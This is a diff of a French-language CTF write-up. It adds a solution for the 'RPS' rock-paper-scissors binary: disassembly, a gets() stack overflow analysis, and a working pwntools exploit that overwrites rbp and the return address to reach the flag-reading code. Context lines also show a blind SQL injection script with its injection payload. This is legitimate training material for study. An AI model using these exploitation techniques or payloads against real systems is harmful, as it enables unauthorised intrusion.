@@ -105,7 +105,7 @@ flag = ''
 for pos in range(20):
     print 'position : %d' % pos
     for car in 'MA{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLNOPQRSTUVWXYZ_-*.:;,?=+':
-        print '\t-> caractére testé : %s' % car
+        print '\t-> caract&eacute;re test&eacute; : %s' % car
 
         params = {'username': "admin' and substr(password," + str(pos+1)  + ",1) = char(" + str(ord(car)) + ") --",
                   'password': 'rien'}
@@ -417,8 +417,300 @@ On supprime le premier qui est inutile et on d&eacute;couvre le flag &eacute;cri
 
 
 ******************
-RPS coming soon
+## [RPS](#)
+by christrc
 ******************
+
+Comme on le voit, il s'agit du jeu Pierre papier ciseaux. Dans cette &eacute;preuve, il faut remporter le duel 50 fois pour avoir le flag.
+
+
+#### Analyse rapide du binaire :
+
+
+```bash
+gdb-peda$ disassemble main
+Dump of assembler code for function main:
+   0x0000000000400806 <+0>:     push   rbp
+   0x0000000000400807 <+1>:     mov    rbp,rsp
+   0x000000000040080a <+4>:     sub    rsp,0x50
+   0x000000000040080e <+8>:     mov    esi,0x400b88
+   0x0000000000400813 <+13>:    mov    edi,0x400b8a
+   0x0000000000400818 <+18>:    call   0x4006f0 <fopen@plt>
+   0x000000000040081d <+23>:    mov    QWORD PTR [rbp-0x18],rax
+   0x0000000000400821 <+27>:    mov    rdx,QWORD PTR [rbp-0x18]
+   0x0000000000400825 <+31>:    lea    rax,[rbp-0x20]
+   0x0000000000400829 <+35>:    mov    rcx,rdx
+   0x000000000040082c <+38>:    mov    edx,0x1
+   0x0000000000400831 <+43>:    mov    esi,0x4
+   0x0000000000400836 <+48>:    mov    rdi,rax
+   0x0000000000400839 <+51>:    call   0x400650 <fread@plt>
+   0x000000000040083e <+56>:    mov    rax,QWORD PTR [rbp-0x18]
+   0x0000000000400842 <+60>:    mov    rdi,rax
+   0x0000000000400845 <+63>:    call   0x400660 <fclose@plt>
+   0x000000000040084a <+68>:    mov    edi,0x400b97
+   0x000000000040084f <+73>:    mov    eax,0x0
+   0x0000000000400854 <+78>:    call   0x400670 <printf@plt>
+   0x0000000000400859 <+83>:    mov    rax,QWORD PTR [rip+0x200a60]        # 0x6012c0 <stdout@@GLIBC_2.2.5>
+   0x0000000000400860 <+90>:    mov    rdi,rax
+   0x0000000000400863 <+93>:    call   0x4006e0 <fflush@plt>
+   0x0000000000400868 <+98>:    lea    rax,[rbp-0x50]
+   0x000000000040086c <+102>:   mov    rdi,rax
+   0x000000000040086f <+105>:   call   0x4006d0 <gets@plt>
+   0x0000000000400874 <+110>:   lea    rax,[rbp-0x50]
+   0x0000000000400878 <+114>:   mov    rsi,rax
+   0x000000000040087b <+117>:   mov    edi,0x400baa
+   0x0000000000400880 <+122>:   mov    eax,0x0
+   0x0000000000400885 <+127>:   call   0x400670 <printf@plt>
+   0x000000000040088a <+132>:   mov    edi,0x400bb2
+   0x000000000040088f <+137>:   call   0x400640 <puts@plt>
+   0x0000000000400894 <+142>:   mov    rax,QWORD PTR [rip+0x200a25]        # 0x6012c0 <stdout@@GLIBC_2.2.5>
+   0x000000000040089b <+149>:   mov    rdi,rax
+   0x000000000040089e <+152>:   call   0x4006e0 <fflush@plt>
+   0x00000000004008a3 <+157>:   mov    eax,DWORD PTR [rbp-0x20]
+   0x00000000004008a6 <+160>:   mov    edi,eax
+   0x00000000004008a8 <+162>:   call   0x400690 <srand@plt>
+   0x00000000004008ad <+167>:   mov    DWORD PTR [rbp-0x4],0x0
+   0x00000000004008b4 <+174>:   jmp    0x400a7a <main+628>
+   0x00000000004008b9 <+179>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x00000000004008bc <+182>:   add    eax,0x1
+   0x00000000004008bf <+185>:   mov    esi,eax
+   0x00000000004008c1 <+187>:   mov    edi,0x400bbf
+   0x00000000004008c6 <+192>:   mov    eax,0x0
+   0x00000000004008cb <+197>:   call   0x400670 <printf@plt>
+   0x00000000004008d0 <+202>:   mov    edi,0x400bcb
+   0x00000000004008d5 <+207>:   mov    eax,0x0
+   0x00000000004008da <+212>:   call   0x400670 <printf@plt>
+   0x00000000004008df <+217>:   mov    rax,QWORD PTR [rip+0x2009da]        # 0x6012c0 <stdout@@GLIBC_2.2.5>
+   0x00000000004008e6 <+224>:   mov    rdi,rax
+   0x00000000004008e9 <+227>:   call   0x4006e0 <fflush@plt>
+   0x00000000004008ee <+232>:   jmp    0x40091b <main+277>
+   0x00000000004008f0 <+234>:   cmp    DWORD PTR [rbp-0x8],0xffffffff
+   0x00000000004008f4 <+238>:   jne    0x4008ff <main+249>
+   0x00000000004008f6 <+240>:   mov    DWORD PTR [rbp-0x8],0x0
+   0x00000000004008fd <+247>:   jmp    0x400929 <main+291>
+   0x00000000004008ff <+249>:   cmp    DWORD PTR [rbp-0x8],0x20
+   0x0000000000400903 <+253>:   je     0x400917 <main+273>
+   0x0000000000400905 <+255>:   cmp    DWORD PTR [rbp-0x8],0xa
+   0x0000000000400909 <+259>:   je     0x400917 <main+273>
+   0x000000000040090b <+261>:   cmp    DWORD PTR [rbp-0x8],0xd
+   0x000000000040090f <+265>:   je     0x400917 <main+273>
+   0x0000000000400911 <+267>:   cmp    DWORD PTR [rbp-0x8],0x9
+   0x0000000000400915 <+271>:   jne    0x400919 <main+275>
+   0x0000000000400917 <+273>:   jmp    0x40091b <main+277>
+   0x0000000000400919 <+275>:   jmp    0x400929 <main+291>
+   0x000000000040091b <+277>:   call   0x4006b0 <getchar@plt>
+   0x0000000000400920 <+282>:   mov    DWORD PTR [rbp-0x8],eax
+   0x0000000000400923 <+285>:   cmp    DWORD PTR [rbp-0x8],0x0
+   0x0000000000400927 <+289>:   jne    0x4008f0 <main+234>
+   0x0000000000400929 <+291>:   cmp    DWORD PTR [rbp-0x8],0x0
+   0x000000000040092d <+295>:   jne    0x400952 <main+332>
+   0x000000000040092f <+297>:   mov    edi,0x400be8
+   0x0000000000400934 <+302>:   call   0x400640 <puts@plt>
+   0x0000000000400939 <+307>:   mov    rax,QWORD PTR [rip+0x200980]        # 0x6012c0 <stdout@@GLIBC_2.2.5>
+   0x0000000000400940 <+314>:   mov    rdi,rax
+   0x0000000000400943 <+317>:   call   0x4006e0 <fflush@plt>
+   0x0000000000400948 <+322>:   mov    eax,0x0
+   0x000000000040094d <+327>:   jmp    0x400ae1 <main+731>
+   0x0000000000400952 <+332>:   mov    eax,DWORD PTR [rbp-0x8]
+   0x0000000000400955 <+335>:   cmp    eax,0x52
+   0x0000000000400958 <+338>:   je     0x400966 <main+352>
+   0x000000000040095a <+340>:   cmp    eax,0x53
+   0x000000000040095d <+343>:   je     0x400978 <main+370>
+   0x000000000040095f <+345>:   cmp    eax,0x50
+   0x0000000000400962 <+348>:   je     0x40096f <main+361>
+   0x0000000000400964 <+350>:   jmp    0x400981 <main+379>
+   0x0000000000400966 <+352>:   mov    DWORD PTR [rbp-0xc],0x0
+   0x000000000040096d <+359>:   jmp    0x4009a4 <main+414>
+   0x000000000040096f <+361>:   mov    DWORD PTR [rbp-0xc],0x1
+   0x0000000000400976 <+368>:   jmp    0x4009a4 <main+414>
+   0x0000000000400978 <+370>:   mov    DWORD PTR [rbp-0xc],0x2
+   0x000000000040097f <+377>:   jmp    0x4009a4 <main+414>
+   0x0000000000400981 <+379>:   mov    edi,0x400bf0
+   0x0000000000400986 <+384>:   call   0x400640 <puts@plt>
+   0x000000000040098b <+389>:   mov    rax,QWORD PTR [rip+0x20092e]        # 0x6012c0 <stdout@@GLIBC_2.2.5>
+   0x0000000000400992 <+396>:   mov    rdi,rax
+   0x0000000000400995 <+399>:   call   0x4006e0 <fflush@plt>
+   0x000000000040099a <+404>:   mov    eax,0x1
+   0x000000000040099f <+409>:   jmp    0x400ae1 <main+731>
+   0x00000000004009a4 <+414>:   call   0x400700 <rand@plt>
+   0x00000000004009a9 <+419>:   mov    ecx,eax
+   0x00000000004009ab <+421>:   mov    edx,0x55555556
+   0x00000000004009b0 <+426>:   mov    eax,ecx
+   0x00000000004009b2 <+428>:   imul   edx
+   0x00000000004009b4 <+430>:   mov    eax,ecx
+   0x00000000004009b6 <+432>:   sar    eax,0x1f
+   0x00000000004009b9 <+435>:   sub    edx,eax
+   0x00000000004009bb <+437>:   mov    eax,edx
+   0x00000000004009bd <+439>:   mov    DWORD PTR [rbp-0x1c],eax
+   0x00000000004009c0 <+442>:   mov    edx,DWORD PTR [rbp-0x1c]
+   0x00000000004009c3 <+445>:   mov    eax,edx
+   0x00000000004009c5 <+447>:   add    eax,eax
+   0x00000000004009c7 <+449>:   add    eax,edx
+   0x00000000004009c9 <+451>:   sub    ecx,eax
+   0x00000000004009cb <+453>:   mov    eax,ecx
+   0x00000000004009cd <+455>:   mov    DWORD PTR [rbp-0x1c],eax
+   0x00000000004009d0 <+458>:   mov    eax,DWORD PTR [rbp-0x1c]
+   0x00000000004009d3 <+461>:   cdqe
+   0x00000000004009d5 <+463>:   mov    rdx,QWORD PTR [rax*8+0x601280]
+   0x00000000004009dd <+471>:   mov    eax,DWORD PTR [rbp-0xc]
+   0x00000000004009e0 <+474>:   cdqe
+   0x00000000004009e2 <+476>:   mov    rax,QWORD PTR [rax*8+0x601280]
+   0x00000000004009ea <+484>:   mov    rsi,rax
+   0x00000000004009ed <+487>:   mov    edi,0x400bfc
+   0x00000000004009f2 <+492>:   mov    eax,0x0
+   0x00000000004009f7 <+497>:   call   0x400670 <printf@plt>
+   0x00000000004009fc <+502>:   mov    eax,DWORD PTR [rbp-0x1c]
+   0x00000000004009ff <+505>:   cmp    eax,DWORD PTR [rbp-0xc]
+   0x0000000000400a02 <+508>:   jne    0x400a14 <main+526>
+   0x0000000000400a04 <+510>:   mov    edi,0x400c03
+   0x0000000000400a09 <+515>:   call   0x400640 <puts@plt>
+   0x0000000000400a0e <+520>:   sub    DWORD PTR [rbp-0x4],0x1
+   0x0000000000400a12 <+524>:   jmp    0x400a67 <main+609>
+   0x0000000000400a14 <+526>:   mov    eax,DWORD PTR [rbp-0x1c]
+   0x0000000000400a17 <+529>:   lea    ecx,[rax+0x1]
+   0x0000000000400a1a <+532>:   mov    edx,0x55555556
+   0x0000000000400a1f <+537>:   mov    eax,ecx
+   0x0000000000400a21 <+539>:   imul   edx
+   0x0000000000400a23 <+541>:   mov    eax,ecx
+   0x0000000000400a25 <+543>:   sar    eax,0x1f
+   0x0000000000400a28 <+546>:   sub    edx,eax
+   0x0000000000400a2a <+548>:   mov    eax,edx
+   0x0000000000400a2c <+550>:   mov    edx,eax
+   0x0000000000400a2e <+552>:   add    edx,edx
+   0x0000000000400a30 <+554>:   add    edx,eax
+   0x0000000000400a32 <+556>:   mov    eax,ecx
+   0x0000000000400a34 <+558>:   sub    eax,edx
+   0x0000000000400a36 <+560>:   cmp    eax,DWORD PTR [rbp-0xc]
+   0x0000000000400a39 <+563>:   jne    0x400a47 <main+577>
+   0x0000000000400a3b <+565>:   mov    edi,0x400c08
+   0x0000000000400a40 <+570>:   call   0x400640 <puts@plt>
+   0x0000000000400a45 <+575>:   jmp    0x400a67 <main+609>
+   0x0000000000400a47 <+577>:   mov    edi,0x400c12
+   0x0000000000400a4c <+582>:   call   0x400640 <puts@plt>
+   0x0000000000400a51 <+587>:   mov    rax,QWORD PTR [rip+0x200868]        # 0x6012c0 <stdout@@GLIBC_2.2.5>
+   0x0000000000400a58 <+594>:   mov    rdi,rax
+   0x0000000000400a5b <+597>:   call   0x4006e0 <fflush@plt>
+   0x0000000000400a60 <+602>:   mov    eax,0x1
+   0x0000000000400a65 <+607>:   jmp    0x400ae1 <main+731>
+   0x0000000000400a67 <+609>:   mov    rax,QWORD PTR [rip+0x200852]        # 0x6012c0 <stdout@@GLIBC_2.2.5>
+   0x0000000000400a6e <+616>:   mov    rdi,rax
+   0x0000000000400a71 <+619>:   call   0x4006e0 <fflush@plt>
+   0x0000000000400a76 <+624>:   add    DWORD PTR [rbp-0x4],0x1
+   0x0000000000400a7a <+628>:   cmp    DWORD PTR [rbp-0x4],0x31
+   0x0000000000400a7e <+632>:   jle    0x4008b9 <main+179>
+   0x0000000000400a84 <+638>:   lea    rax,[rbp-0x50]
+   0x0000000000400a88 <+642>:   mov    rsi,rax
+   0x0000000000400a8b <+645>:   mov    edi,0x400c1b
+   0x0000000000400a90 <+650>:   mov    eax,0x0
+   0x0000000000400a95 <+655>:   call   0x400670 <printf@plt>
+   0x0000000000400a9a <+660>:   mov    esi,0x400b88
+   0x0000000000400a9f <+665>:   mov    edi,0x400c2c
+   0x0000000000400aa4 <+670>:   call   0x4006f0 <fopen@plt>
+   0x0000000000400aa9 <+675>:   mov    QWORD PTR [rbp-0x18],rax
+   0x0000000000400aad <+679>:   mov    rax,QWORD PTR [rbp-0x18]
+   0x0000000000400ab1 <+683>:   mov    rdx,rax
+   0x0000000000400ab4 <+686>:   mov    esi,0x64
+   0x0000000000400ab9 <+691>:   mov    edi,0x601300
+   0x0000000000400abe <+696>:   call   0x4006a0 <fgets@plt>
+   0x0000000000400ac3 <+701>:   mov    edi,0x601300
+   0x0000000000400ac8 <+706>:   call   0x400640 <puts@plt>
+   0x0000000000400acd <+711>:   mov    rax,QWORD PTR [rip+0x2007ec]        # 0x6012c0 <stdout@@GLIBC_2.2.5>
+   0x0000000000400ad4 <+718>:   mov    rdi,rax
+   0x0000000000400ad7 <+721>:   call   0x4006e0 <fflush@plt>
+   0x0000000000400adc <+726>:   mov    eax,0x0
+   0x0000000000400ae1 <+731>:   leave
+   0x0000000000400ae2 <+732>:   ret
+End of assembler dump.
+```
+
+
+
+On peut voir d'apr&egrave;s le code assembleur que le jeu repose sur un g&eacute;n&eacute;rateur de nombre al&eacute;atoire pour cr&eacute;er le "duel". La section de code ci-dessous se charge d'additionner et de comparer le nombre de victoires &agrave; 0x31 = 50. Si le nombre est inf&eacute;rieur &agrave; 50 la boucle de jeu recommence jusqu'&agrave; atteindre 50 / ou une d&eacute;faite / ou une non incr&eacute;mentation en cas d'&eacute;galit&eacute; (dans les 2 derniers cas ce segment de code ne sera jamais appel&eacute;).
+
+```bash
+0x0000000000400a71 <+619>:      call   0x4006e0 <fflush@plt>
+0x0000000000400a76 <+624>:      add    DWORD PTR [rbp-0x4],0x1
+0x0000000000400a7a <+628>:      cmp    DWORD PTR [rbp-0x4],0x31
+0x0000000000400a7e <+632>:      jle    0x4008b9 <main+179>
+```
+
+
+
+Apr&egrave;s quelques essais j'ai pu voir qu'on pouvait r&eacute;&eacute;crire RIP &agrave; partir de l'offset 88 (aucune fonction apr&egrave;s analyse rapide ne se charge de checker la valeur que l'on entre, on peut donc r&eacute;&eacute;crire tr&egrave;s facilement l'addresse de retour &agrave; la sortie de main )
+
+
+La section de code suivante se charge d'ouvrir et d'afficher le fichier 'flag.txt' en cas de victoire .
+
+
+```bash
+0x0000000000400a9a <+660>:      mov    esi,0x400b88
+0x0000000000400a9f <+665>:      mov    edi,0x400c2c                  --> 'flag.txt'
+0x0000000000400aa4 <+670>:      call   0x4006f0 <fopen@plt>
+0x0000000000400aa9 <+675>:      mov    QWORD PTR [rbp-0x18],rax
+0x0000000000400aad <+679>:      mov    rax,QWORD PTR [rbp-0x18]
+0x0000000000400ab1 <+683>:      mov    rdx,rax
+0x0000000000400ab4 <+686>:      mov    esi,0x64
+0x0000000000400ab9 <+691>:      mov    edi,0x601300
+0x0000000000400abe <+696>:      call   0x4006a0 <fgets@plt>
+0x0000000000400ac3 <+701>:      mov    edi,0x601300
+0x0000000000400ac8 <+706>:      call   0x400640 <puts@plt>
+0x0000000000400acd <+711>:      mov    rax,QWORD PTR [rip+0x2007ec]        # 0x6012c0 <stdout@@GLIBC_2.2.5>
+0x0000000000400ad4 <+718>:      mov    rdi,rax
+0x0000000000400ad7 <+721>:      call   0x4006e0 <fflush@plt>
+0x0000000000400adc <+726>:      mov    eax,0x0
+```
+
+
+La solution la plus "&eacute;vidente" serait d'&eacute;craser la sortie de main pour pointer vers cette addresse et donc de faire croire que l'on a "gagn&eacute;" par exemple cette addresse :
+
+```bash
+0x0000000000400a9a <+660>:      mov    esi,0x400b88
+```
+
+Mais un probl&egrave;me se pose , l'addresse `0x0000000000400a9a` contient un 0a qui est filtr&eacute; , donc on ne peut pas jumper dessus.. Va falloir ruser..
+
+Un peu plus haut dans le code on voit ceci: `0x00000000004008b4 <+174>:     jmp    0x400a7a <main+628>` qui nous am&egrave;ne ici: `0x0000000000400a7a <+628>: cmp    DWORD PTR [rbp-0x4],0x31`
+
+Le probl&egrave;me qui va vite se poser: dans un stack buffer overflow classique ebp/rbp est réécrit juste avant eip/rip donc `DWORD PTR [rbp-0x4]` pointera sur une addresse non valide et le programme crashera.
+Donc il nous faut mettre une addresse valide dans rbp...
+J'ai choisi la section data pour cela avec cette op&eacute;ration --> `overwrite_rbp = util.packing.p64(0x601284)`
+
+Pourquoi cette addresse?
+
+Regardons ce qu'il y a dans la section data avec la commande objdump -s rsp:
+
+```text
+Contents of section .data:
+
+601270 00000000 00000000 00000000 00000000  ................
+601280 740b4000 00000000 790b4000 00000000  t.@.....y.@.....    l'addresse 0x601284 satisfait 2 conditions
+601290 7f0b4000 00000000                    ..@.....            elle est valide pour rbp et la valeur 740b4000 > 50
+```
+
+Donc  `cmp    DWORD PTR [rbp-0x4],0x31` est bien > 50 donc notre code continuera vers l'ouverture du fichier contenant flag.txt
+
+
+Voici le code de l'exploit:
+
+```python
+from pwn import *
+
+jmp = util.packing.p64(0x00000000004008b4)
+overwrite_rbp = util.packing.p64(0x601284)   # overwrite rbp -> valeur sup a 0x31
+
+p = remote("milkyway.chal.mmactf.link", 1641)
+print p.recv()
+p.sendline('A' * 80 + overwrite_rbp + jmp)
+print p.recv()
+p.sendline('q')
+print p.recv()
+print p.recv()
+e = raw_input() # debug
+```
+
+And get the flag !
+
+
 
 **********************
 Unfinished:
@@ -470,11 +762,11 @@ but I was missing the first character '7' and I forgot that with the command __s
 Real flag was MMA{7a35hxb9q81fsg6}
 
 
-Mortal Magi agent, stream and
 
 ### QRcode:
 
-![](qrcodeV0.png)  ![](qrcodeV1.png)
+![](qrcodeV0.png)  ![](qrcodeV1.png)   ![](qrcodeV2.png)
+
 
 
 
